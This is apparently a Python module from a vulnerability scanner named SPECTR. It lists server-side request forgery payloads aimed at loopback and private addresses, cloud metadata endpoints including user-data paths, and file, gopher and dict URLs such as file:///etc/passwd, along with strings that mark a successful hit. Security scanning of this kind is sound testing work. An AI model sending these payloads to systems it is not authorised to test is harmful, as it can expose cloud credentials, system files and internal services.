"""Server-Side Request Forgery (SSRF) payloads for SPECTR scanner"""

class SsrfPayloads:
    """Collection of SSRF payloads"""

    # Local network payloads
    LOCAL_NETWORK_PAYLOADS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://192.168.1.1/",
    "http://10.0.0.1/",
    "http://127.0.0.1:22/",
    "http://127.0.0.1:80/",
    "http://192.168.0.1/",
    "http://10.0.1.1/",
    "http://172.16.0.1/",
    "http://172.16.1.1/",
    "http://192.168.1.100/",
    "http://10.1.1.1/",
    "http://localhost:8080/",
    "http://127.0.0.1:443/"
        ]

# Cloud metadata payloads
    CLOUD_METADATA_PAYLOADS = [
    "http://169.254.169.254/",
    "http://169.254.169.254/metadata/",
    "http://169.254.169.254/latest/",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/2009-04-04/meta-data/",
    "http://169.254.169.254/2019-04-04/meta-data/",
    "http://169.254.169.254/latest/dynamic/",
    "http://169.254.169.254/latest/dynamic/instance-identity/"
        ]
        
    PROTOCOL_PAYLOADS = [
    "file:///etc/passwd",
    "file:///c:/windows/system32/drivers/etc/hosts",
    "gopher://127.0.0.1:80/",
    "dict://127.0.0.1:11211/"
        ]


    @classmethod
    def get_all_payloads(cls):
        """Get all SSRF payloads"""
        return cls.LOCAL_NETWORK_PAYLOADS + cls.CLOUD_METADATA_PAYLOADS

    @classmethod
    def get_success_indicators(cls):
        """Get indicators that suggest successful SSRF"""
        return [
            "ami-id",
            "instance-id", 
            "localhost",
            "127.0.0.1",
            "metadata"
        ]
